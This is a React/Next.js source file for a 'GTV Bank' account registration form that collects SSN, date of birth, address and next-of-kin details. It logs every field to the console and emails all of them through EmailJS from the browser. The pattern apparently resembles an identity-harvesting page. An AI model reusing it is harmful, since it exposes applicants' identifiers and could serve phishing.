"use client";

import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import { ChevronRight } from "lucide-react";
import { accountTypes, employmentTypes, incomeRanges } from "@/mockdata";

export default function GTVBankForm() {
  const formRef = useRef<HTMLFormElement>(null);
  const [loading, setLoading] = useState(false);

  const inputStyle =
    "w-full border border-[#555] bg-[#fff] text-[#222] rounded-md px-3 py-2 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500";
  const selectStyle =
    "w-full border border-[#555] bg-[#fff] text-[#222] rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500";
  const fileStyle =
    "w-full border border-[#555] bg-[#fff] text-[#222] rounded-md px-3 py-2 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-600 file:text-[#222] hover:file:bg-blue-700";

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!formRef.current) return;

    const formData = new FormData(formRef.current);
    const obj = Object.fromEntries(formData.entries());

    const messageValues = Object.entries(obj)
      .map(([key, value]) => `${key}: ${value}`)
      .join("\n");

    const emailParams = {
      message: messageValues,
      from_name: formData.get("fullName") || "",
      to_name: "GTV Bank",
    };

    console.log("Form Data:", messageValues);
    const isEmpty = Array.from(formData.values()).every(
      (v) => v === "" || v === null || (v instanceof File && v.size === 0)
    );
    if (isEmpty) {
      alert("Please fill all fields before submitting.");
      return;
    }

    // Build message dynamically
    const message = `
      New GTV Bank application received:
      Name: ${formData.get("fullName")}
      Email: ${formData.get("email")}
      Phone: ${formData.get("phone")}
      Account Type: ${formData.get("accountType")}
      Employment Type: ${formData.get("employmentType")}
      Annual Income: ${formData.get("annualIncome")}
      Nationality: ${formData.get("nationality")}
      City: ${formData.get("city")}
      State: ${formData.get("state")}
      Beneficiary: ${formData.get("beneficiaryName")}
    `;
    formData.set("message", message); // attach dynamic message

    setLoading(true);

    try {
      const result = await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
        emailParams,
        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
      );

      if (result.status === 200) {
        alert("✅ Application submitted successfully!");
        formRef.current.reset();
      } else {
        alert("⚠ Something went wrong. Please try again.");
      }
    } catch (error) {
      console.error(error);
      alert("❌ Failed to send application. Please try again later.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-gray-100">
      <div className="max-w-5xl mx-auto px-4 py-8 sm:px-6 lg:px-8">
        <div className="bg-white rounded-lg shadow-xl overflow-hidden">
          {/* Header */}
          <div className="bg-blue-600 px-6 py-4 flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="bg-white p-2 rounded">
                <svg
                  className="w-8 h-8 text-blue-600"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
                  <path
                    fillRule="evenodd"
                    d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
              <h1 className="text-2xl font-bold text-white">GTV BANK</h1>
            </div>
          </div>

          {/* Form */}
          <form
            ref={formRef}
            onSubmit={handleSubmit}
            encType="multipart/form-data"
            className="p-6 sm:p-8"
          >
            {/* Hidden fields for EmailJS dynamic variables */}
            <input type="hidden" name="to_name" value="GTV Bank" />
            <input type="hidden" name="from_name" value="" />
            <input type="hidden" name="message" value="" />

            <div className="mb-8 text-center">
              <h2 className="text-3xl font-bold text-gray-800 mb-2">
                Account Registration
              </h2>
              <p className="text-gray-600">
                Complete all sections to open your account
              </p>
            </div>

            {/* Personal Details */}
            <Section title="1" label="Personal Details">
              <input
                type="text"
                name="fullName"
                placeholder="Full Name"
                required
                className={inputStyle}
              />
              <input
                type="email"
                name="email"
                placeholder="Email Address"
                required
                className={inputStyle}
              />
              <input
                type="tel"
                name="phone"
                placeholder="Phone Number"
                required
                className={inputStyle}
              />
              <select name="title" required className={selectStyle}>
                <option value="">Select Title</option>
                <option>Mr</option>
                <option>Mrs</option>
                <option>Miss</option>
                <option>Dr</option>
              </select>
              <select name="gender" required className={selectStyle}>
                <option value="">Select Gender</option>
                <option>Male</option>
                <option>Female</option>
              </select>
              <input
                type="text"
                name="zipCode"
                placeholder="Zip Code"
                required
                className={inputStyle}
              />
              <input
                type="date"
                name="dateOfBirth"
                required
                className={inputStyle}
              />
            </Section>

            {/* Employment */}
            <Section title="2" label="Employment Information">
              <input
                type="text"
                name="ssn"
                placeholder="SSN / NI / SIN"
                required
                className={inputStyle}
              />
              <select name="accountType" required className={selectStyle}>
                <option value="">Select Account Type</option>
                {accountTypes.map((t) => (
                  <option key={t}>{t}</option>
                ))}
              </select>
              <select name="employmentType" required className={selectStyle}>
                <option value="">Type of Employment</option>
                {employmentTypes.map((t) => (
                  <option key={t}>{t}</option>
                ))}
              </select>
              <select name="annualIncome" required className={selectStyle}>
                <option value="">Annual Income Range</option>
                {incomeRanges.map((r) => (
                  <option key={r}>{r}</option>
                ))}
              </select>
            </Section>

            {/* Address */}
            <Section title="3" label="Address">
              <input
                type="text"
                name="addressLine"
                placeholder="Address Line"
                required
                className={inputStyle}
              />
              <input
                type="text"
                name="city"
                placeholder="City"
                required
                className={inputStyle}
              />
              <input
                type="text"
                name="state"
                placeholder="State"
                required
                className={inputStyle}
              />
              <input
                type="text"
                name="nationality"
                placeholder="Nationality"
                required
                className={inputStyle}
              />
            </Section>

            {/* Next of Kin */}
            <Section title="4" label="Next of Kin">
              <input
                type="text"
                name="beneficiaryName"
                placeholder="Beneficiary Name"
                required
                className={inputStyle}
              />
              <input
                type="text"
                name="nextOfKinAddress"
                placeholder="Next of Kin Address"
                required
                className={inputStyle}
              />
              <select name="relationship" required className={selectStyle}>
                <option value="">Relationship</option>
                <option>Spouse</option>
                <option>Parent</option>
                <option>Sibling</option>
                <option>Child</option>
              </select>
              <input
                type="number"
                name="age"
                placeholder="Age"
                required
                className={inputStyle}
              />
            </Section>

            {/* Submit */}
            <div className="ml-11">
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center space-x-2 transition duration-200 shadow-lg"
              >
                {loading ? "Submitting..." : "Submit Application"}
                <ChevronRight className="w-5 h-5" />
              </button>
              <p className="text-center text-sm text-gray-600 mt-4">
                By submitting this form, you agree to our Terms and Conditions.
              </p>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}

function Section({ title, label, children, columns = 2 }: any) {
  return (
    <div className="mb-8">
      <h3 className="text-xl font-bold text-gray-800 mb-2 flex items-center">
        <span className="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 text-sm">
          {title}
        </span>
        {label}
      </h3>
      <div className={`ml-11 grid grid-cols-1 md:grid-cols-${columns} gap-4`}>
        {children}
      </div>
    </div>
  );
}
